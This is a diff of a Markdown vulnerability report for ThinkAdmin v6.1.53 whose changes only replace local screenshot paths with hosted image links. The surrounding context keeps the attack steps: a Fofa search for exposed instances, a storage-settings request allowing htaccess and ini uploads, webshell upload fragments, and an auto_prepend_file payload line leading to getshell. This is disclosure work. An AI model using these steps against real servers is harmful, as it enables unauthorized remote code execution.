@@ -11,24 +11,28 @@ Official website: https://thinkadmin.top/
 
 
 Audit version: ThinkAdmin Version v6.1.53
-![img](file:///C:\Users\38123\AppData\Local\Temp\ksohtml17300\wps1.jpg)
+![image](https://github.com/1dreamGN/CVE/assets/112082417/35545e1b-e345-40e9-b502-898b98944dc9)
+
 
  
 
 Fofa : body="/admin/api.plugs/script"
-![img](file:///C:\Users\38123\AppData\Local\Temp\ksohtml17300\wps2.jpg)
+![image](https://github.com/1dreamGN/CVE/assets/112082417/32f29b86-1841-441c-9b91-253dc1e53b44)
+
 
 Vulnerability: Directory traversal+file upload=getshell
 Install Composer on the official website
 After installation, log in and enter the background
 Firstly, set the uploadable suffix for the backend
 
-![image-20231116184032885](C:\Users\38123\AppData\Roaming\Typora\typora-user-images\image-20231116184032885.png)
+![image](https://github.com/1dreamGN/CVE/assets/112082417/5beca66e-6158-4642-9bc4-7ea68c022b31)
+
 
 http://localhost/admin/config/storage.html?spm=m-1-2-3
 param：storage%5Bname_type%5D=xmd5&storage%5Blink_type%5D=none&storage%5Ballow_exts%5D=doc%2Cgif%2Cico%2Cjpg%2Cmp3%2Cmp4%2Cp12%2Cpem%2Cpng%2Czip%2Crar%2Cxls%2Cxlsx%2Chtaccess%2Cini&storage%5Blocal_http_protocol%5D=follow&storage%5Blocal_http_domain%5D=&storage%5Btype%5D=local
 
-![image-20231116184045081](C:\Users\38123\AppData\Roaming\Typora\typora-user-images\image-20231116184045081.png)
+![image](https://github.com/1dreamGN/CVE/assets/112082417/5d2dde5f-24a3-4022-b7b2-6f7405dfdc08)
+
 
 First upload a Trojan with any file content as webshell
 
@@ -78,7 +82,8 @@ Content-Type: image/png
 
 ------WebKitFormBoundary3VyVEPpvQynFo76H--`
 
-![image-20231116184205379](C:\Users\38123\AppData\Roaming\Typora\typora-user-images\image-20231116184205379.png)
+![image](https://github.com/1dreamGN/CVE/assets/112082417/df639676-98ae-4e83-bbf4-25491472ea26)
+
 
 Construct Payload Upload
 
@@ -130,13 +135,14 @@ auto_prepend_file=1.zip
 
 ------WebKitFormBoundary3VyVEPpvQynFo76H--`
 
-![image-20231116184237606](C:\Users\38123\AppData\Roaming\Typora\typora-user-images\image-20231116184237606.png)
+![image](https://github.com/1dreamGN/CVE/assets/112082417/6e90c2b4-8c5e-44a4-945c-cb98e30a86f6)
 
-![image-20231116184242352](C:\Users\38123\AppData\Roaming\Typora\typora-user-images\image-20231116184242352.png)
+![image](https://github.com/1dreamGN/CVE/assets/112082417/94ec0974-5103-4735-b179-24af001735e1)
 
 You can see that everything has been uploaded successfully
 
-![img](file:///C:\Users\38123\AppData\Local\Temp\ksohtml17300\wps3.jpg) 
+![image](https://github.com/1dreamGN/CVE/assets/112082417/0ebdec09-b37b-4f7f-a8d8-066c0b84c734)
+
 
  
 
